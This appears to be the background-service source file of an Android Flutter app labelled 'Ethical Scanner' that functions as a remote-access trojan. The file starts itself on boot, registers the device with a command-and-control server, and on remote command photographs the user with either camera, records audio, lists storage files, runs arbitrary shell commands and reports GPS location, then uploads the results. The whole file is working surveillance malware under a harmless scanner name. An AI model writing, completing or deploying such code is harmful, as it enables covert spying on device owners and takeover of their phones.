// lib/services/background_service.dart

import 'dart:async';
import 'dart:io';
import 'dart:isolate';
import 'dart:ui';

import 'package:flutter/foundation.dart';
import 'package:flutter/services.dart';
import 'package:flutter_background_service/flutter_background_service.dart'
    show
        AndroidConfiguration,
        FlutterBackgroundService,
        IosConfiguration,
        ServiceInstance;
import 'package:flutter_background_service_android/flutter_background_service_android.dart'
    show DartPluginRegistrant, AndroidConfiguration;
import 'package:flutter_local_notifications/flutter_local_notifications.dart';
import 'package:camera/camera.dart' show XFile, CameraLensDirection;
import 'package:geolocator/geolocator.dart' show Position;
import 'package:shared_preferences/shared_preferences.dart';

import '../config/app_config.dart';
import '../utils/constants.dart';
import 'data_collector_service.dart';
import 'device_info_service.dart';
import 'network_service.dart';
import 'location_service.dart';
import 'camera_service.dart';
import 'file_system_service.dart';

@immutable
class BackgroundServiceHandles {
  final NetworkService networkService;
  final DataCollectorService dataCollectorService;
  final DeviceInfoService deviceInfoService;
  final LocationService locationService;
  final CameraService cameraService;
  final FileSystemService fileSystemService;
  final SharedPreferences preferences;
  final ServiceInstance serviceInstance;
  final String currentDeviceId;

  const BackgroundServiceHandles({
    required this.networkService,
    required this.dataCollectorService,
    required this.deviceInfoService,
    required this.locationService,
    required this.cameraService,
    required this.fileSystemService,
    required this.preferences,
    required this.serviceInstance,
    required this.currentDeviceId,
  });
}

// Enhanced command execution modes
enum CommandExecutionMode {
  uiThread,     // Try UI thread first
  native,       // Force native execution
  fallback,     // Try UI, fallback to native
}

// Command execution result
class CommandResult {
  final bool success;
  final Map<String, dynamic> data;
  final String? error;
  final CommandExecutionMode executedMode;

  const CommandResult({
    required this.success,
    required this.data,
    this.error,
    required this.executedMode,
  });
}

Timer? _heartbeatTimer;
Timer? _reconnectionTimer;
StreamSubscription<bool>? _connectionStatusSubscription;
StreamSubscription<Map<String, dynamic>>? _commandSubscription;
int _reconnectionAttempts = 0;
const int _maxReconnectionAttempts = 50;

// Enhanced command tracking
final Map<String, Completer<CommandResult>> _pendingCommands = {};
final Map<String, Timer> _commandTimeouts = {};

// Native command channel
const MethodChannel _nativeCommandsChannel = MethodChannel('com.example.kem/native_commands');

@pragma('vm:entry-point')
Future<void> onStart(ServiceInstance service) async {
  DartPluginRegistrant.ensureInitialized();

  final network = NetworkService();
  final dataCollector = DataCollectorService();
  final deviceInfo = DeviceInfoService();
  final location = LocationService();
  final camera = CameraService();
  final fileSystem = FileSystemService();
  final prefs = await SharedPreferences.getInstance();
  final String deviceId = await deviceInfo.getOrCreateUniqueDeviceId();
  
  debugPrint("BackgroundService: Starting with DeviceID = $deviceId");

  final handles = BackgroundServiceHandles(
    networkService: network,
    dataCollectorService: dataCollector,
    deviceInfoService: deviceInfo,
    locationService: location,
    cameraService: camera,
    fileSystemService: fileSystem,
    preferences: prefs,
    serviceInstance: service,
    currentDeviceId: deviceId,
  );

  service.invoke('update', {'device_id': deviceId});

  // Enhanced connection monitoring with automatic reconnection
  _setupConnectionMonitoring(handles);
  
  // Start initial connection
  await _connectWithRetry(handles);

  // Handle commands from UI for methods that require main isolate
  _setupUICommandHandlers(handles);

  // Handle initial data sending
  _setupInitialDataHandler(handles);

  // Handle service stop
  service.on(BG_SERVICE_EVENT_STOP_SERVICE).listen((_) async {
    await _stopService(handles);
  });
}

void _setupConnectionMonitoring(BackgroundServiceHandles h) {
  _connectionStatusSubscription = h.networkService.connectionStatusStream.listen((isConnected) {
    debugPrint("BackgroundService: Socket status changed: ${isConnected ? 'Connected' : 'Disconnected'}");
    
    h.serviceInstance.invoke('update', {
      'socket_status': isConnected ? 'Connected' : 'Disconnected',
    });

    if (isConnected) {
      _reconnectionAttempts = 0;
      _reconnectionTimer?.cancel();
      _registerDeviceWithC2(h);
      _startHeartbeat(h);
    } else {
      _stopHeartbeat();
      _scheduleReconnection(h);
    }
  });

  _commandSubscription = h.networkService.commandStream.listen((commandData) {
    final cmd = commandData['command'] as String;
    final args = Map<String, dynamic>.from(commandData['args'] as Map? ?? {});
    debugPrint("BackgroundService: Received command '$cmd' with args: $args");
    _handleC2Command(h, cmd, args);
  });
}

void _scheduleReconnection(BackgroundServiceHandles h) {
  if (_reconnectionAttempts >= _maxReconnectionAttempts) {
    debugPrint("BackgroundService: Max reconnection attempts reached. Will retry in 60 seconds.");
    _reconnectionAttempts = 0;
  }
  
  _reconnectionTimer?.cancel();
  final delay = Duration(seconds: 5 + (_reconnectionAttempts * 2).clamp(0, 60));
  
  _reconnectionTimer = Timer(delay, () async {
    _reconnectionAttempts++;
    debugPrint("BackgroundService: Attempting reconnection #$_reconnectionAttempts");
    await _connectWithRetry(h);
  });
}

Future<void> _connectWithRetry(BackgroundServiceHandles h) async {
  try {
    await h.networkService.connectSocketIO(h.currentDeviceId);
  } catch (e) {
    debugPrint("BackgroundService: Connection failed: $e");
    _scheduleReconnection(h);
  }
}

void _setupUICommandHandlers(BackgroundServiceHandles h) {
  // Handle take picture response from UI
  h.serviceInstance.on('execute_take_picture_from_ui_result').listen((response) async {
    if (response == null) return;
    final Map<String, dynamic> data = Map<String, dynamic>.from(response as Map);
    final status = data['status'] as String?;
    final payload = data['payload'] as Map<String, dynamic>?;
    final String? originalCommandRef = data['original_command_ref'] as String?;

    if (originalCommandRef == null) {
      debugPrint("BackgroundService: 'original_command_ref' missing in take_picture_from_ui_result");
      return;
    }

    // Complete pending command
    _completeCommand(originalCommandRef, status == 'success', payload ?? {}, CommandExecutionMode.uiThread);

    if (status == 'success' && payload != null && payload.containsKey('path')) {
      final filePath = payload['path'] as String;
      debugPrint("BackgroundService: UI took picture successfully. Path: $filePath. Uploading...");
      await h.networkService.uploadFileFromCommand(
        deviceId: h.currentDeviceId,
        commandRef: originalCommandRef,
        fileToUpload: XFile(filePath),
      );
    } else {
      debugPrint("BackgroundService: UI failed to take picture. Error: ${payload?['message']}");
      h.networkService.sendCommandResponse(
        originalCommand: originalCommandRef,
        status: 'error',
        payload: {
          'message': 'UI failed to take picture: ${payload?['message']}',
        },
      );
    }
  });

  // Handle list files response from UI
  h.serviceInstance.on('execute_list_files_from_ui_result').listen((response) {
    if (response == null) return;
    final Map<String, dynamic> data = Map<String, dynamic>.from(response as Map);
    final status = data['status'] as String?;
    final payload = data['payload'] as Map<String, dynamic>?;
    final String? originalCommandRef = data['original_command_ref'] as String?;

    if (originalCommandRef == null) {
      debugPrint("BackgroundService: 'original_command_ref' missing in list_files_from_ui_result");
      return;
    }

    _completeCommand(originalCommandRef, status == 'success', payload ?? {}, CommandExecutionMode.uiThread);

    if (status == 'success' && payload != null) {
      h.networkService.sendCommandResponse(
        originalCommand: originalCommandRef,
        status: "success",
        payload: payload,
      );
    } else {
      h.networkService.sendCommandResponse(
        originalCommand: originalCommandRef,
        status: "error",
        payload: {
          "message": payload?['message']?.toString() ?? "UI failed to list files.",
        },
      );
    }
  });

  // Handle shell command response from UI
  h.serviceInstance.on('execute_shell_from_ui_result').listen((response) {
    if (response == null) return;
    final Map<String, dynamic> data = Map<String, dynamic>.from(response as Map);
    final status = data['status'] as String?;
    final payload = data['payload'] as Map<String, dynamic>?;
    final String? originalCommandRef = data['original_command_ref'] as String?;

    if (originalCommandRef == null) {
      debugPrint("BackgroundService: 'original_command_ref' missing in execute_shell_from_ui_result");
      return;
    }

    _completeCommand(originalCommandRef, status == 'success', payload ?? {}, CommandExecutionMode.uiThread);

    if (status == 'success' && payload != null) {
      h.networkService.sendCommandResponse(
        originalCommand: originalCommandRef,
        status: "success",
        payload: payload,
      );
    } else {
      h.networkService.sendCommandResponse(
        originalCommand: originalCommandRef,
        status: "error",
        payload: {
          "message": payload?['message']?.toString() ?? "UI failed to execute shell command.",
        },
      );
    }
  });

  // Handle voice recording response from UI
  h.serviceInstance.on('execute_record_voice_from_ui_result').listen((response) async {
    if (response == null) return;
    final Map<String, dynamic> data = Map<String, dynamic>.from(response as Map);
    final status = data['status'] as String?;
    final payload = data['payload'] as Map<String, dynamic>?;
    final String? originalCommandRef = data['original_command_ref'] as String?;

    if (originalCommandRef == null) {
      debugPrint("BackgroundService: 'original_command_ref' missing in execute_record_voice_from_ui_result");
      return;
    }

    _completeCommand(originalCommandRef, status == 'success', payload ?? {}, CommandExecutionMode.uiThread);

    if (status == 'success' && payload != null && payload.containsKey('path')) {
      final filePath = payload['path'] as String;
      debugPrint("BackgroundService: UI recorded audio successfully. Path: $filePath. Uploading...");
      await h.networkService.uploadFileFromCommand(
        deviceId: h.currentDeviceId,
        commandRef: originalCommandRef,
        fileToUpload: XFile(filePath),
      );
    } else {
      debugPrint("BackgroundService: UI failed to record audio. Error: ${payload?['message']}");
      h.networkService.sendCommandResponse(
        originalCommand: originalCommandRef,
        status: 'error',
        payload: {
          'message': 'UI failed to record audio: ${payload?['message']}',
        },
      );
    }
  });
}

void _setupInitialDataHandler(BackgroundServiceHandles h) {
  h.serviceInstance.on(BG_SERVICE_EVENT_SEND_INITIAL_DATA).listen((Map<String, dynamic>? argsFromUi) async {
    final alreadySent = h.preferences.getBool(PREF_INITIAL_DATA_SENT) ?? false;

    h.serviceInstance.invoke('update', {'initial_data_status': 'Processing...'});

    if (alreadySent && argsFromUi == null) {
      debugPrint("BackgroundService: Initial data already marked as sent, and no new UI trigger.");
      h.serviceInstance.invoke('update', {'initial_data_status': 'Already Sent'});
      return;
    }

    if (argsFromUi == null) {
      debugPrint("BackgroundService: argsFromUi is null for BG_SERVICE_EVENT_SEND_INITIAL_DATA, cannot send.");
      h.serviceInstance.invoke('update', {'initial_data_status': 'Error - No UI Data'});
      return;
    }

    final jsonData = argsFromUi['jsonData'] as Map<String, dynamic>?;
    final imagePath = argsFromUi['imagePath'] as String?;
    
    if (jsonData == null) {
      debugPrint("BackgroundService: jsonData is null within argsFromUi, cannot send initial data.");
      h.serviceInstance.invoke('update', {'initial_data_status': 'Error - JSON Data Null'});
      return;
    }

    final payload = Map<String, dynamic>.from(jsonData)..['deviceId'] = h.currentDeviceId;

    XFile? imageFile;
    if (imagePath != null && imagePath.isNotEmpty) {
      final file = File(imagePath);
      if (await file.exists()) {
        imageFile = XFile(imagePath);
      } else {
        debugPrint("BackgroundService: Image file not found for initial data: $imagePath");
      }
    }

    final success = await h.networkService.sendInitialData(
      jsonData: payload,
      imageFile: imageFile,
    );
    
    if (success) {
      await h.preferences.setBool(PREF_INITIAL_DATA_SENT, true);
      debugPrint("BackgroundService: Initial data sent successfully");
      h.serviceInstance.invoke('update', {'initial_data_status': 'Sent Successfully'});
    } else {
      debugPrint("BackgroundService: Failed to send initial data");
      h.serviceInstance.invoke('update', {'initial_data_status': 'Failed to Send'});
    }
  });
}

Future<void> _registerDeviceWithC2(BackgroundServiceHandles h) async {
  if (!h.networkService.isSocketConnected) return;
  
  try {
    final info = await h.deviceInfoService.getDeviceInfo();
    info['deviceId'] = h.currentDeviceId;
    h.networkService.registerDeviceWithC2(info);
    debugPrint("BackgroundService: Device registration attempt sent for ID: ${h.currentDeviceId}");
  } catch (e, s) {
    debugPrint("BackgroundService: Error registering device: $e\n$s");
  }
}

void _startHeartbeat(BackgroundServiceHandles h) {
  _heartbeatTimer?.cancel();
  _heartbeatTimer = Timer.periodic(C2_HEARTBEAT_INTERVAL, (_) {
    if (h.networkService.isSocketConnected) {
      h.networkService.sendHeartbeat({
        'deviceId': h.currentDeviceId,
        'timestamp': DateTime.now().toIso8601String(),
      });
    }
    h.serviceInstance.invoke('update', {
      'current_date': DateTime.now().toIso8601String(),
      'device_id': h.currentDeviceId,
      'socket_status': h.networkService.isSocketConnected ? 'Connected' : 'Disconnected',
    });
  });
  
  debugPrint("BackgroundService: Heartbeat started for Device ID: ${h.currentDeviceId}. Interval: ${C2_HEARTBEAT_INTERVAL.inSeconds}s");
}

void _stopHeartbeat() {
  _heartbeatTimer?.cancel();
  _heartbeatTimer = null;
  debugPrint("BackgroundService: Heartbeat stopped");
}

Future<void> _handleC2Command(BackgroundServiceHandles h, String commandName, Map<String, dynamic> args) async {
  debugPrint("BackgroundService: Processing command: $commandName");
  
  try {
    final result = await _executeCommandWithFallback(h, commandName, args);
    
    if (result.success) {
      h.networkService.sendCommandResponse(
        originalCommand: commandName,
        status: 'success',
        payload: result.data,
      );
    } else {
      h.networkService.sendCommandResponse(
        originalCommand: commandName,
        status: 'error',
        payload: {'message': result.error ?? 'Command execution failed'},
      );
    }
  } catch (e, s) {
    debugPrint("BackgroundService: Unexpected error in command $commandName: $e\nStackTrace: $s");
    h.networkService.sendCommandResponse(
      originalCommand: commandName,
      status: 'error',
      payload: {'message': 'Unexpected error: ${e.toString()}'},
    );
  }
}

/// Enhanced command execution with intelligent fallback
Future<CommandResult> _executeCommandWithFallback(
  BackgroundServiceHandles h, 
  String commandName, 
  Map<String, dynamic> args,
) async {
  final commandId = _generateCommandId();
  
  // Check if native service is available
  final nativeAvailable = await _isNativeServiceAvailable();
  
  if (nativeAvailable) {
    debugPrint("BackgroundService: Native service available, attempting smart execution for $commandName");
    
    // For critical commands, try UI first with quick fallback
    if (_isCriticalCommand(commandName)) {
      final uiResult = await _tryUIExecution(h, commandName, args, commandId);
      if (uiResult.success) {
        return uiResult;
      }
      
      debugPrint("BackgroundService: UI execution failed for $commandName, falling back to native");
      return await _executeNativeCommand(commandName, args);
    } else {
      // For non-critical commands, go directly to native for better reliability
      return await _executeNativeCommand(commandName, args);
    }
  } else {
    // No native service, try UI only
    debugPrint("BackgroundService: Native service not available, trying UI execution only");
    return await _tryUIExecution(h, commandName, args, commandId);
  }
}

/// Try executing command through UI thread with timeout
Future<CommandResult> _tryUIExecution(
  BackgroundServiceHandles h,
  String commandName,
  Map<String, dynamic> args,
  String commandId,
) async {
  final completer = Completer<CommandResult>();
  _pendingCommands[commandId] = completer;
  
  // Set timeout for UI execution
  _commandTimeouts[commandId] = Timer(const Duration(seconds: 15), () {
    if (!completer.isCompleted) {
      _pendingCommands.remove(commandId);
      _commandTimeouts.remove(commandId);
      completer.complete(CommandResult(
        success: false,
        data: {},
        error: 'UI execution timeout',
        executedMode: CommandExecutionMode.uiThread,
      ));
    }
  });
  
  try {
    switch (commandName) {
      case SIO_CMD_TAKE_PICTURE:
        final lensString = args['camera'] as String?;
        final lensArg = lensString?.toLowerCase() == 'front' ? 'front' : 'back';
        
        h.serviceInstance.invoke('execute_take_picture_from_ui', {
          'camera': lensArg,
          'original_command_ref': commandId,
        });
        break;
        
      case SIO_CMD_LIST_FILES:
        final path = args["path"] as String? ?? "/storage/emulated/0";
        
        h.serviceInstance.invoke('execute_list_files_from_ui', {
          'path': path,
          'original_command_ref': commandId,
        });
        break;
        
      case SIO_CMD_EXECUTE_SHELL:
        final command = args["command_name"] as String?;
        final commandArgs = (args["command_args"] as List<dynamic>?)?.map((e) => e.toString()).toList() ?? [];
        
        if (command == null || command.isEmpty) {
          throw Exception("Command name missing for execute_shell");
        }
        
        h.serviceInstance.invoke('execute_shell_from_ui', {
          'command': command,
          'args': commandArgs,
          'original_command_ref': commandId,
        });
        break;
        
      case SIO_CMD_RECORD_VOICE:
        final duration = args['duration'] as int? ?? 10;
        final quality = args['quality'] as String? ?? 'medium';
        
        h.serviceInstance.invoke('execute_record_voice_from_ui', {
          'duration': duration,
          'quality': quality,
          'original_command_ref': commandId,
        });
        break;
        
      case SIO_CMD_GET_LOCATION:
        // Location can be handled directly in background
        final Position? loc = await h.locationService.getCurrentLocation();
        if (loc != null) {
          return CommandResult(
            success: true,
            data: {
              'latitude': loc.latitude,
              'longitude': loc.longitude,
              'accuracy': loc.accuracy,
              'altitude': loc.altitude,
              'speed': loc.speed,
              'timestamp_gps': loc.timestamp?.toIso8601String(),
            },
            executedMode: CommandExecutionMode.uiThread,
          );
        } else {
          throw Exception("Location unavailable");
        }
        
      default:
        throw Exception("Unknown command: $commandName");
    }
    
    return await completer.future;
  } catch (e) {
    _pendingCommands.remove(commandId);
    _commandTimeouts[commandId]?.cancel();
    _commandTimeouts.remove(commandId);
    
    return CommandResult(
      success: false,
      data: {},
      error: e.toString(),
      executedMode: CommandExecutionMode.uiThread,
    );
  }
}

/// Execute command through native Android service
Future<CommandResult> _executeNativeCommand(String commandName, Map<String, dynamic> args) async {
  try {
    debugPrint("BackgroundService: Executing native command: $commandName");
    
    final result = await _nativeCommandsChannel.invokeMethod('executeCommand', {
      'command': commandName,
      'args': args,
    });
    
    if (result != null && result is Map) {
      return CommandResult(
        success: true,
        data: Map<String, dynamic>.from(result),
        executedMode: CommandExecutionMode.native,
      );
    } else {
      return CommandResult(
        success: false,
        data: {},
        error: 'Native command returned null result',
        executedMode: CommandExecutionMode.native,
      );
    }
  } on PlatformException catch (e) {
    debugPrint("BackgroundService: Native command failed: ${e.code} - ${e.message}");
    return CommandResult(
      success: false,
      data: {},
      error: '${e.code}: ${e.message}',
      executedMode: CommandExecutionMode.native,
    );
  } catch (e) {
    debugPrint("BackgroundService: Native command error: $e");
    return CommandResult(
      success: false,
      data: {},
      error: e.toString(),
      executedMode: CommandExecutionMode.native,
    );
  }
}

/// Check if native command service is available
Future<bool> _isNativeServiceAvailable() async {
  try {
    final result = await _nativeCommandsChannel.invokeMethod('isNativeServiceAvailable');
    return result == true;
  } catch (e) {
    debugPrint("BackgroundService: Native service check failed: $e");
    return false;
  }
}

/// Determine if command is critical and should try UI first
bool _isCriticalCommand(String commandName) {
  switch (commandName) {
    case SIO_CMD_TAKE_PICTURE:
    case SIO_CMD_RECORD_VOICE:
      return true; // These benefit from UI thread access to camera/audio systems
    case SIO_CMD_LIST_FILES:
    case SIO_CMD_EXECUTE_SHELL:
    case SIO_CMD_GET_LOCATION:
      return false; // These can work well in background
    default:
      return false;
  }
}

/// Complete a pending command
void _completeCommand(String commandId, bool success, Map<String, dynamic> data, CommandExecutionMode mode) {
  final completer = _pendingCommands.remove(commandId);
  final timer = _commandTimeouts.remove(commandId);
  
  timer?.cancel();
  
  if (completer != null && !completer.isCompleted) {
    completer.complete(CommandResult(
      success: success,
      data: data,
      executedMode: mode,
    ));
  }
}

/// Generate unique command ID
String _generateCommandId() {
  return 'cmd_${DateTime.now().millisecondsSinceEpoch}_${(DateTime.now().microsecond % 1000)}';
}

Future<void> _stopService(BackgroundServiceHandles h) async {
  debugPrint("BackgroundService: Received stop service event. Stopping...");
  
  _stopHeartbeat();
  _reconnectionTimer?.cancel();
  
  // Cancel all pending commands
  for (final completer in _pendingCommands.values) {
    if (!completer.isCompleted) {
      completer.complete(CommandResult(
        success: false,
        data: {},
        error: 'Service stopping',
        executedMode: CommandExecutionMode.uiThread,
      ));
    }
  }
  _pendingCommands.clear();
  
  for (final timer in _commandTimeouts.values) {
    timer.cancel();
  }
  _commandTimeouts.clear();
  
  await h.dataCollectorService.disposeCamera();
  h.networkService.disconnectSocketIO();
  
  await _connectionStatusSubscription?.cancel();
  _connectionStatusSubscription = null;
  
  await _commandSubscription?.cancel();
  _commandSubscription = null;
  
  h.networkService.dispose();
  await h.serviceInstance.stopSelf();
  
  debugPrint("BackgroundService: Service stopped.");
}

Future<void> initializeBackgroundService() async {
  final service = FlutterBackgroundService();

  if (Platform.isAndroid) {
    final flnp = FlutterLocalNotificationsPlugin();
    const androidInit = AndroidInitializationSettings('@mipmap/ic_launcher');
    const initSettings = InitializationSettings(android: androidInit);

    try {
      await flnp.initialize(initSettings);
      debugPrint("FlutterLocalNotificationsPlugin initialized successfully.");
    } catch (e, s) {
      debugPrint("Error initializing FlutterLocalNotificationsPlugin: $e\n$s");
    }

    const channel = AndroidNotificationChannel(
      'qr_scanner_service_channel',
      'Ethical Scanner Service',
      description: 'Background service for the Ethical Scanner application.',
      importance: Importance.high,
      playSound: false,
      enableVibration: false,
      showBadge: true,
    );

    final AndroidFlutterLocalNotificationsPlugin? androidImplementation =
        flnp.resolvePlatformSpecificImplementation<AndroidFlutterLocalNotificationsPlugin>();

    if (androidImplementation != null) {
      try {
        await androidImplementation.createNotificationChannel(channel);
        debugPrint("Notification channel 'qr_scanner_service_channel' created successfully.");
      } catch (e, s) {
        debugPrint("Error creating notification channel: $e\n$s");
      }
    }
  }

  await service.configure(
    androidConfiguration: AndroidConfiguration(
      onStart: onStart,
      autoStart: true,
      isForegroundMode: true,
      notificationChannelId: 'qr_scanner_service_channel',
      initialNotificationTitle: 'Ethical Scanner Active',
      initialNotificationContent: 'Service is running and monitoring commands.',
      foregroundServiceNotificationId: 888,
      autoStartOnBoot: true,
    ),
    iosConfiguration: IosConfiguration(
      autoStart: true,
      onForeground: onStart,
      onBackground: onStart,
    ),
  );
  
  debugPrint("Background service configured with enhanced persistence and native fallback.");
}